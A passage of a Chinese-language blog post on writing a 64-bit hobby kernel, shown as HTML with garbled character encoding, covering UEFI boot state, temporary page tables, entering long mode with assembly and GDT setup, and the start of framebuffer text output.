href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> å· 3ï¼‰</li><li>å¤„åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹</li><li><strong>å¯èƒ½</strong>å¼€å¯äº†åˆ†é¡µï¼Œè‹¥æ˜¯ï¼Œåˆ™ UEFI å†…å­˜æ˜ å°„å®šä¹‰çš„ä»»ä½•å†…å­˜ç©ºé—´éƒ½æ˜¯æ’ç­‰æ˜ å°„çš„ï¼ˆè™šæ‹Ÿåœ°å€ç­‰äºç‰©ç†åœ°å€ï¼‰ï¼Œå¯¹å…¶ä»–åŒºåŸŸçš„æ˜ å°„æ˜¯æœªå®šä¹‰çš„ï¼Œå¯èƒ½å› å®ç°è€Œå¼‚</li><li>é€‰æ‹©å­ï¼ˆselectorï¼‰è®¾ä¸ºâ€œå¹³å¦æ¨¡å¼â€ï¼ˆflat modelï¼‰æˆ–æœªä½¿ç”¨</li><li>ä¸­æ–­å¼€å¯ï¼Œä¸è¿‡ä»…æ”¯æŒ UEFI å¼•å¯¼æœåŠ¡è®¡æ—¶å™¨ï¼ˆæ‰€æœ‰åŠ è½½çš„è®¾å¤‡é©±åŠ¨éƒ½é€šè¿‡â€œè½®è¯¢â€è¿›è¡ŒåŒæ­¥æœåŠ¡ï¼‰</li><li>EFLAGS ä¸­çš„æ–¹å‘æ ‡å¿—ä½è¢«æ¸…é™¤</li><li>å…¶ä»–é€šç”¨æ ‡å¿—å¯„å­˜å™¨æœªå®šä¹‰</li><li>128 KB æˆ–æ›´å¤šçš„å¯ç”¨æ ˆç©ºé—´</li><li>æ ˆä¸º 16 å­—èŠ‚å¯¹é½ï¼Œå¯èƒ½åœ¨é¡µè¡¨ä¸­è¢«æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œ</li><li><code>floating-point control word</code> è¢«åˆå§‹åŒ–ä¸º <code>0x027F</code>ï¼ˆall exceptions masked, double-extended-precision, round-to-nearestï¼‰</li><li><code>Multimedia-extensions control word</code> è¢«åˆå§‹åŒ–ä¸º <code>0x1F80</code> (all exceptions masked, roundto-nearest, flush to zero for masked underflow)</li><li><code>CR0.EM == 0</code></li><li><code>CR0.TS == 0</code></li></ul><blockquote><p>é€‰æ‹©å­çš„å¹³å¦æ¨¡å¼ç¤ºæ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115220200.png"></p></blockquote><h3 id="â‘¢-åˆå§‹åŒ–æ ˆä¸ä¸´æ—¶é¡µè¡¨"><a href="#â‘¢-åˆå§‹åŒ–æ ˆä¸ä¸´æ—¶é¡µè¡¨" class="headerlink" title="â‘¢ åˆå§‹åŒ–æ ˆä¸ä¸´æ—¶é¡µè¡¨"></a>â‘¢ åˆå§‹åŒ–æ ˆä¸ä¸´æ—¶é¡µè¡¨</h3><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡º BIOS å¯åŠ¨ä¸ UEFI å¯åŠ¨åçš„æœºå™¨çŠ¶æ€åœ¨ 32 ä½ä¸‹å·®åˆ«å¹¶ä¸å¤§ï¼Œå¤§å®¶éƒ½åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œåªæ˜¯ UEFI å¯åŠ¨<strong>å¯èƒ½</strong>ä¼šé¢å¤–å¤šä¸€ä¸ªæ ˆå’Œé¡µè¡¨çš„é…ç½®ï¼Œä¸è¿‡æˆ‘ä»¬å®Œå…¨å¯ä»¥ <em>æŠ›å¼ƒ UEFI å¸®æˆ‘ä»¬é¢„è®¾å¥½çš„é¡µè¡¨ä¸æ ˆï¼Œè‡ªå·±ä»å¤´å¼€å§‹åˆå§‹åŒ–ä¸€ä¸ª</em></p><p>é¦–å…ˆæ˜¯é¡µè¡¨çš„åˆå§‹åŒ–ï¼Œç”±äºç°åœ¨å°šæœªå®Œæˆå†…å­˜ç®¡ç†å™¨çš„æ„å»ºï¼Œå› æ­¤ç¬”è€…é€‰æ‹©ä»…æ„å»ºä¸€ä¸ªä¸´æ—¶çš„é¡µè¡¨ï¼Œå¾…åˆ°è¿›å…¥ 64 ä½é•¿æ¨¡å¼å®Œæˆå†…å­˜æ¢æµ‹ä¸å†…å­˜åˆ†é…å™¨çš„å»ºç«‹ä¹‹åå†é‡æ–°å»ºç«‹ä¸€ä¸ªæ­£å¼çš„æ–°é¡µè¡¨ï¼Œ64 ä½æ¨¡å¼ä¸‹æ‰€ç”¨çš„é€šå¸¸æ˜¯å››çº§é¡µè¡¨ï¼Œè™šæ‹Ÿåœ°å€æœ‰æ•ˆé•¿åº¦ä¸º 48 ä½ï¼Œåœ¨æ§åˆ¶å¯„å­˜å™¨ç»„ï¼ˆcontrol registersï¼‰ä¸­çš„ CR3 å¯„å­˜å™¨ä¸­å­˜æ”¾é¡¶å±‚é¡µè¡¨çš„åœ°å€ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115214456.png"></p><blockquote><p>é¡µè¡¨æ‰€ä½¿ç”¨çš„æ¨¡å¼ç”± CR4 å¯„å­˜å™¨å†³å®šï¼Œå…·ä½“å¯ä»¥å‚è§ Intel SDM çš„ 3102 é¡µ 4.1.1 Four Paging Modes</p></blockquote><p>ä¸è¿‡å¯åŠ¨é˜¶æ®µè‹¥æ˜¯æˆ‘ä»¬çš„ä¸´æ—¶é¡µè¡¨ä¹Ÿé‡‡ç”¨ 4 çº§é¡µè¡¨çš„ç»“æ„çš„è¯ï¼Œæˆ–è®¸ä¼šéœ€è¦å ç”¨è¿‡å¤šçš„å†…å­˜ç©ºé—´æ¥ä¿è¯å¯¹æ‰€æœ‰å†…å­˜çš„æ˜ å°„ï¼Œå› ä¸ºè¿™ä¸ªé¡µè¡¨åªæ˜¯åœ¨å†…å­˜ç®¡ç†å™¨å»ºç«‹èµ·æ¥ä¹‹å‰ä¸´æ—¶ä¸€ç”¨ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <strong>1GB çš„å¤§é¡µ</strong>ï¼Œè¿™æ ·åªéœ€è¦ä¸¤å¼ é¡µé¢ç»„æˆçš„äºŒçº§é¡µè¡¨ä¾¿èƒ½æ’‘èµ·æˆ‘ä»¬åˆæœŸæ‰€éœ€çš„æ‰€æœ‰çš„å†…å­˜ç©ºé—´ï¼Œ<strong>å¾…åˆ°å®Œæˆæœ€åŸºæœ¬çš„å†…å­˜ç®¡ç†å™¨çš„åˆå§‹åŒ–ä¹‹åå†é‡æ–°è¿›è¡Œé¡µè¡¨çš„åŠ¨æ€åˆå§‹åŒ–</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127203951.png"></p><p>1 GB å¤§é¡µçš„å¼€å¯éœ€è¦æˆ‘ä»¬è¿›å…¥ 64 ä½ï¼Œå¹¶åœ¨é¡µè¡¨é¡¹ä¸­è®¾ç½® <code>PS</code> ä½ï¼Œæ­¤å¤–ï¼Œè¿›å…¥ 64 ä½æ¨¡å¼è¦æ±‚æˆ‘ä»¬å¯ç”¨<strong>ç‰©ç†åœ°å€æ‰©å±•</strong>ï¼ˆPhysical Address Extensionï¼‰ï¼Œè¿™é¡¹ç‰¹æ€§å°†é¡µè¡¨é¡¹ä» 4 å­—èŠ‚æ‰©å±•ä¸º 8 å­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¿›å…¥ 64 ä½ä¹‹å‰é€šè¿‡è®¾ç½® CR4 å¯„å­˜å™¨çš„ PAE ä½æ¥å¯ç”¨è¯¥ç‰¹æ€§ï¼Œå¹¶åœ¨æå‰åœ¨é¢„å…ˆå‡†å¤‡å¥½çš„äºŒçº§é¡µè¡¨ä¸­è®¾ç½® <code>PS</code> ä½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section .boot.text32:<br>    .code32<br>    .align 0x1000<br>    .extern boot_main<br><br>    .globl _start<br><br>    _start:<br>        # turn off the interrupt temporarily,<br>        # and we should turn it on after our own IDT has been built.<br>        cli<br><br>        # check for multiboot2 header<br>        cmp $MULTIBOOT2_BOOTLOADER_MAGIC, %eax<br>        jne .loop<br><br>        # temporary stack<br>        mov     $boot_stack_top, %esp<br><br>        # set the boot information as parameters for boot_main()<br>        mov     %eax, %edi<br>        mov     %ebx, %esi<br><br>        # clear eflags<br>        pushl   $0<br>        popf<br><br>        # disable paging (UEFI may turn it on)<br>        mov     %cr0, %eax<br>        mov     $CR0_PG, %ebx<br>        not     %ebx<br>        and     %ebx, %eax<br>        mov     %eax, %cr0<br><br>        # set up page table for booting stage<br>        # it&#x27;s okay to write only 32bit here :)<br>        mov     $boot_pud, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW), %eax<br>        mov     %eax, boot_pgd<br><br>        xor     %eax, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW | PAGE_ATTR_PS), %eax<br>        movl    %eax, boot_pud<br><br>        xor     %eax, %eax<br>        mov     %eax, (boot_pgd + 4)<br>        mov     %eax, (boot_pud + 4)<br><br>        # load page table<br>        mov     $boot_pgd, %eax<br>        mov     %eax, %cr3<br><br>#......<br><br>.section .boot.data<br>    .section .boot.data:<br>    .align 0x1000<br><br>    .globl boot_stack, boot_stack_top<br><br>    #<br>    # When the system is booted under legacy BIOS, there&#x27;s no stack<br>    # So we reserve a page there as a temporary stack for booting<br>    #<br>    boot_stack:<br>        .space 0x1000<br>    boot_stack_top:<br><br>    boot_pgd:<br>        .space 0x1000<br>    boot_pud:<br>        .space 0x1000<br><br></code></pre></td></tr></table></figure><h3 id="â‘£-è¿›å…¥-64-ä½æ¨¡å¼"><a href="#â‘£-è¿›å…¥-64-ä½æ¨¡å¼" class="headerlink" title="â‘£ è¿›å…¥ 64 ä½æ¨¡å¼"></a>â‘£ è¿›å…¥ 64 ä½æ¨¡å¼</h3><p>64 ä½è¿è¡Œæ¨¡å¼ï¼ˆIntel ç§°ä¸º <code>IA-32e mode</code>ï¼ŒAMD ç§°ä¸º <code>long mode</code>ï¼‰æ˜¯è¿›å…¥ 64 ä½æ—¶ä»£å x64 å¤„ç†å™¨å¼•å…¥çš„<strong>æ–°çš„è¿è¡Œæ¨¡å¼</strong>ï¼Œå…¶æœ‰ç€ä¸¤ä¸ªå­æ¨¡å¼ï¼š</p><ul><li>å…¼å®¹æ¨¡å¼ï¼ˆCompatibility modeï¼‰ï¼šä¼ ç»Ÿçš„ 16&#x2F;32 ä½åº”ç”¨ç¨‹åºä»èƒ½æ­£å¸¸è¿è¡Œï¼Œç±»ä¼¼äº 32 ä½ä¿æŠ¤æ¨¡å¼ï¼Œå…¶ä½¿ç”¨ 16&#x2F;32 ä½åœ°å€ä¸æ“ä½œæ•°ï¼Œä»…èƒ½è®¿é—®çº¿æ€§åœ°å€ç©ºé—´çš„å‰ 4 GBï¼Œé€šè¿‡ PAE å¯ä»¥è®¿é—®æ›´å¤šçš„ç‰©ç†å†…å­˜</li><li>çº¯ 64 ä½æ¨¡å¼ï¼ˆ64-bit modeï¼‰ï¼šè¯¥æ¨¡å¼ä¸‹å¯ä»¥è®¿é—® 64 ä½çº¿æ€§åœ°å€ç©ºé—´ï¼Œ <em>é€šå¸¸</em> ä¸å†ä½¿ç”¨åˆ†æ®µï¼Œé€šç”¨å¯„å­˜å™¨ä¸ SIMD æ‰©å±•å¯„å­˜å™¨ä» 8 ä¸ªæ‰©å±•è‡³ 16 ä¸ªï¼Œé€šç”¨å¯„å­˜å™¨æ‰©å±•è‡³ 64 ä½ï¼Œé»˜è®¤åœ°å€å¤§å°ä¸º 64 ä½ï¼Œé»˜è®¤æ“ä½œæ•°å¤§å°ä¸º 32 ä½ï¼Œæ–°å¢çš„ opcode å‰ç¼€ <code>REX</code> ç”¨ä»¥è¿›è¡Œ 64 ä½ä¸‹çš„æ‰©å±•è®¿é—®</li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png"></p><blockquote><p>å‚è§ Intel SDM å· 1 Chapter 3ã€å· 3A Chapter 2 ä¸ AMD64 PM å· 1 Chapter 2ã€å· 2 Chapter 1</p><blockquote><p><del>ç¿»å¤§ç –å¤´å…¨è‹±æ‰‹å†ŒçœŸç»™ğŸ‘´æ•´éº»äº†</del></p></blockquote></blockquote><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯è¿›å…¥ 64 ä½æ¨¡å¼ä¹‹åæ­£å¸¸è¿è¡Œ 64 ä½åº”ç”¨å°±åœ¨çº¯ 64 ä½æ¨¡å¼ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡å…¼å®¹æ¨¡å¼æ¥åƒ 32 ä½ä¿æŠ¤æ¨¡å¼é‚£æ ·è¿è¡Œä»¥å‰çš„ 32 ä½åº”ç”¨ï¼Œè¿™ä¸¤ç§å­æ¨¡å¼é—´çš„åˆ‡æ¢<strong>é€šè¿‡ CS æ®µé€‰æ‹©å­å¯¹åº”çš„æ®µæè¿°ç¬¦çš„ L ä½å†³å®š</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129171602.png" alt="AMD64 å¤„ç†å™¨è¿è¡Œæ¨¡å¼åˆ‡æ¢"></p><p>æˆ‘ä»¬çš„ 64 ä½æ“ä½œç³»ç»Ÿè‡ªç„¶æ˜¯è¿è¡Œåœ¨çº¯ 64 ä½è¿™ä¸€å­æ¨¡å¼ä¸‹çš„ï¼Œè€Œ GRUB å¼•å¯¼è¿›å…¥æˆ‘ä»¬çš„å†…æ ¸æ—¶æˆ‘ä»¬ä»å¤„äº 32 ä½æ¨¡å¼ä¸‹ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¼–å†™ 32 ä½æ±‡ç¼–æ¥å°†å¤„ç†å™¨åˆ‡æ¢åˆ° 64 ä½æ¨¡å¼ï¼Œå…·ä½“éœ€è¦è¿›è¡Œå¦‚ä¸‹å·¥ä½œï¼š</p><ul><li>å°† **Model Specific Register **è¿™ä¸€å¯„å­˜å™¨ç»„ä¸­çš„ <strong>Extended Feature Enable Register</strong> å¯„å­˜å™¨çš„ LME ä½ç½®ä¸º 1ï¼ˆå‚è§ Intel SDM å· 3 A Chapter 2 çš„ 2.2.1 èŠ‚ï¼ŒTable 2-1ï¼‰</li><li>é…ç½®å¥½ç›¸åº”çš„å…¨å±€æ®µæè¿°ç¬¦è¡¨ï¼Œå¹¶å°† CS æ®µé€‰æ‹©å­å¯¹åº”çš„æ®µæè¿°ç¬¦çš„ L ä½ç½®ä¸º 1</li><li>å¼€å¯æ§åˆ¶å¯„å­˜å™¨ç»„ä¸­ CR4 å¯„å­˜å™¨çš„ <strong>ç‰©ç†åœ°å€æ‰©å±•</strong>ï¼ˆPhysical Address Extensionï¼‰</li><li>å¼€å¯æ§åˆ¶å¯„å­˜å™¨ç»„ä¸­ CR0 å¯„å­˜å™¨çš„ <strong>åˆ†é¡µ</strong>ï¼ˆPagingï¼‰ï¼Œè¿™è¦æ±‚æˆ‘ä»¬é¢„å…ˆè£…è½½ä¸€ä»½é¡µè¡¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">        # enable PAE and PGE<br>        mov     %cr4, %eax<br>        or      $(CR4_PAE | CR4_PGE), %eax<br>        mov     %eax, %cr4<br><br>        # enter long mode by enabling EFER.LME<br>        mov     $0xC0000080, %ecx<br>        rdmsr<br>        or      $(1 &lt;&lt; 8), %eax<br>        wrmsr<br><br>        # enable paging<br>        mov     %cr0, %eax<br>        or      $CR0_PG, %eax<br>        mov     %eax, %cr0<br><br>        # set up GDT<br>        mov     $gdt64_ptr, %eax<br>        lgdt    0(%eax)<br><br>#......<br><br>.section .boot.data<br>    #......<br><br>    # global segment descriptor table<br>    .align 0x1000   # it should be aligned to page<br>    .globl gdt64, gdt64_ptr<br>    gdt64:<br>        .quad 0 # first one must be zero<br>    gdt64_code_segment:<br>        .quad 0x00209A0000000000 # exec/read<br>    gdt64_data_segment:<br>        .quad 0x0000920000000000 # read/write<br>    gdt64_ptr:<br>        .short gdt64_ptr - gdt64 - 1    # GDT limit<br>        .long gdt64                     # GDT Addr<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬ä¾¿æ¥åˆ°äº† 64 ä½<strong>å…¼å®¹æ¨¡å¼</strong>ï¼Œè€Œè¦è¿›å…¥çº¯ 64 ä½æ¨¡å¼ï¼Œåˆ™éœ€è¦æˆ‘ä»¬<strong>æ‰‹åŠ¨æ›´æ–° CS æ®µé€‰æ‹©å­</strong>ï¼Œè¿™é‡Œç¬”è€…é€šè¿‡ä¸€ä¸ªè¿œè·³è½¬ <code>jmp</code> æŒ‡ä»¤<strong>æ‰‹åŠ¨æŒ‡å®šæ®µé€‰æ‹©å­çš„æ–¹å¼æ¥åˆ·æ–° CS æ®µé€‰æ‹©å­</strong>ï¼š</p><blockquote><p>é™¤äº†é€šè¿‡ <code>jmp é€‰æ‹©å­:ç›®æ ‡åœ°å€</code> çš„æ–¹å¼ä»¥å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ <code>lretq</code> æŒ‡ä»¤åˆ·æ–° CS æ®µé€‰æ‹©å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>    pushq   $(1 &lt;&lt; SELECTOR_INDEX)<br>    pushq   $boot_main<br>    lretq<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>ä»¥åŠåˆ«å¿˜äº†åˆ·æ–°æ•°æ®æ®µé€‰æ‹©å­å’Œå…¶ä»–æ®µé€‰æ‹©å­ï¼Œè¿™äº›é€‰æ‹©å­å¯ä»¥ç›´æ¥é€šè¿‡å¯„å­˜å™¨è¿›è¡Œé‡æ–°èµ‹å€¼ï¼Œ<strong>ä½†æ˜¯ CS æ®µé€‰æ‹©å­å¿…é¡»é€šè¿‡æŒ‡ä»¤è¿›è¡Œåˆ·æ–°</strong></p></blockquote><p>ä» <code>boot_main()</code> å¼€å§‹æˆ‘ä»¬å°±å¯ä»¥è¿›å…¥ C è¯­è¨€çš„ä¸–ç•Œäº†ï¼šï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    # reload all the segment registers<br>    mov $(2 &lt;&lt; SELECTOR_INDEX), %ax<br>    mov     %ax, %ds<br>    mov     %ax, %ss<br>    mov     %ax, %es<br>    mov     %ax, %fs<br>    mov     %ax, %gs<br><br>    # enter the 64-bit world within a long jmp<br>    jmp $(1 &lt;&lt; SELECTOR_INDEX), $boot_main<br><br>    # we shouldn&#x27;t get here...<br>.loop:<br>    hlt<br>    jmp .loop<br></code></pre></td></tr></table></figure><blockquote><h4 id="Extra-åˆ†æ®µå†…å­˜ç®€ä»‹"><a href="#Extra-åˆ†æ®µå†…å­˜ç®€ä»‹" class="headerlink" title="Extra. åˆ†æ®µå†…å­˜ç®€ä»‹"></a>Extra. åˆ†æ®µå†…å­˜ç®€ä»‹</h4><p>åœ¨å¤è€çš„ 16 ä½ä¸ 32 ä½è¿è¡Œæ¨¡å¼ä¸‹ï¼Œx86 æœ‰ä¸€ç§ç®¡ç†å†…å­˜çš„åŠæ³•å«åš<strong>åˆ†æ®µ</strong>ï¼ˆSegmentï¼‰ï¼Œä¸€ä¸ªæ®µä¾¿æ˜¯ä¸€æ®µè¿ç»­å†…å­˜ï¼Œç›¸åº”åœ°æœ‰ csã€ds ç­‰æ®µå¯„å­˜å™¨ç”¨æ¥æŒ‡ç¤ºä¸åŒç”¨é€”çš„æ®µï¼Œç»è¿‡åˆ†æ®µæ˜ å°„çš„åœ°å€ç§°ä¸ºé€»è¾‘åœ°å€ï¼ˆlogical addressï¼‰</p><p>16 ä½ä¸‹æ®µå¯„å­˜å™¨ä¸­ç›´æ¥å­˜æ”¾æ®µåŸºå€ä¸æ®µç•Œé™ä¿¡æ¯ï¼Œ32 ä½ä¸‹æ®µæè¿°ç¬¦æ‰©å±•ä¸º 8 å­—èŠ‚ï¼Œå­˜æ”¾åœ¨å†…å­˜ä¸­ä¸€ä¸ªåä¸ºæ®µæè¿°ç¬¦è¡¨çš„ç»“æ„ä¸­ï¼ŒGDTR å¯„å­˜å™¨ç”¨æ¥å­˜æ”¾å…¨å±€æ®µæè¿°ç¬¦è¡¨çš„åœ°å€ï¼Œç›¸åº”åœ°æ®µå¯„å­˜å™¨ä¸­å­˜æ”¾çš„å˜ä¸ºæ®µé€‰æ‹©å­ï¼ˆsegment selectorï¼‰ï¼ŒæŒ‡ç¤ºäº†è¯¥æ®µå¯„å­˜å™¨å¯¹åº”çš„æ®µåœ¨æ®µæè¿°ç¬¦è¡¨ä¸­çš„ç´¢å¼•ã€æƒé™ç­‰ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129183708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184644.png" alt="32 ä½ä¸‹çš„æ®µæè¿°ç¬¦"></p><p>ä¸è¿‡åˆ†æ®µå†…å­˜æ¨¡å¼è¿‡äºé¸¡è‚‹ï¼Œç°ä»£æ“ä½œç³»ç»Ÿé€šå¸¸ä¼šé€‰æ‹©æŠŠæ‰€æœ‰æ®µéƒ½åˆå§‹åŒ–ä¸ºæ•´ä¸ªå†…å­˜ï¼Œå› æ­¤ CPU å‚å•†æ›´æ”¹äº†è®¾è®¡ï¼Œåœ¨ 64 ä½ä¸‹é»˜è®¤ä¸ä½¿ç”¨åˆ†æ®µç‰¹æ€§ï¼Œä¸è¿‡ <em>ä¹Ÿä¸æ˜¯å®Œå…¨å¼ƒç”¨åˆ†æ®µè¿™ä¸€ç‰¹æ€§</em> ï¼ˆå°¾å¤§ä¸æ‰å±äºæ˜¯ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184734.png" alt="64 ä½ä¸‹çš„æ®µæè¿°ç¬¦"></p></blockquote><h2 id="boot-tty-cï¼šè¯»å†™-frame-buffer-è¿›è¡Œæ–‡å­—è¾“å‡º"><a href="#boot-tty-cï¼šè¯»å†™-frame-buffer-è¿›è¡Œæ–‡å­—è¾“å‡º" class="headerlink" title="boot_tty.cï¼šè¯»å†™ frame buffer è¿›è¡Œæ–‡å­—è¾“å‡º"></a>boot_tty.cï¼šè¯»å†™ frame buffer è¿›è¡Œæ–‡å­—è¾“å‡º</h2><p>ç†Ÿæ‚‰å„ç±»æ“ä½œç³»ç»Ÿå¼€å‘æ•™ç¨‹çš„å°ä¼™ä¼´è‚¯å®šçŸ¥é“éå¸¸ç»å…¸çš„è¯»å†™ <code>0xB8000</code> è¿™å—å†…å­˜ä¾¿èƒ½åœ¨å±å¹•ä¸Šè¿›è¡Œå­—ä½“è¾“å‡ºï¼Œ <strong>ä½†æ˜¯åœ¨ UEFI å¯åŠ¨ä¸‹è¿™ä¸ªæ–¹æ³•å·²ç»ä¸åœ¨å¯ç”¨</strong> ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆè¿›è¡Œå­—ä½“è¾“å‡ºå‘¢ï¼Ÿæœ€ç®€å•çš„åŠæ³•è‡ªç„¶æ˜¯â€”â€”<strong>æŠŠåƒç´ ç‚¹ç›´æ¥ç”»åœ¨å±å¹•ä¸Š</strong></p><h3 id="â‘ -Frame-Buffer"><a href="#â‘ -Frame-Buffer" class="headerlink" title="â‘  Frame Buffer"></a>â‘  Frame Buffer</h3><p><strong>å¸§ç¼“å†²åŒº</strong> ï¼ˆ <strong>frame buffer</strong> ï¼‰ä¸ºå†…å­˜&#x2F;æ˜¾å­˜ä¸­çš„ä¸€å—è‡ªå®šä¹‰åŒºåŸŸï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºå±å¹•ä¸Šæ‰€æ˜¾ç¤ºå†…å®¹çš„ç¼“å­˜ï¼Œæ˜¾å¡ä¼šå®šæœŸä»è¿™å—åŒºåŸŸæ¬è¿æ•°æ®åˆ°æ˜¾ç¤ºè®¾å¤‡ä¸Šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å†™ frame buffer çš„æ–¹å¼æ¥åœ¨æ˜¾ç¤ºå™¨çš„æŒ‡å®šä½ç½®æ˜¾ç¤ºæŒ‡å®šçš„åƒç´ ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129185224.png"></p><p>æœ‰äº† Multiboot2 è§„èŒƒï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡ç¤º GRUB2 å¸®æˆ‘ä»¬å‡†å¤‡ Frame buffer çš„ç›¸å…³ä¿¡æ¯å¹¶ä¼ é€’ç»™æˆ‘ä»¬çš„å†…æ ¸ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿èƒ½é€šè¿‡ç›´æ¥è¯»å†™ frame buffer å¯¹åº”å†…å­˜çš„æ–¹å¼æ¥ç›´æ¥åœ¨å±å¹•ä¸Šè¿›è¡Œæ˜¾ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* frame buffer info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> *framebuffer_base; <span class="hljs-comment">/* 32 bit color */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_width;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_height;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">boot_clear_screen</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; framebuffer_height; y++) &#123;<br>        <span 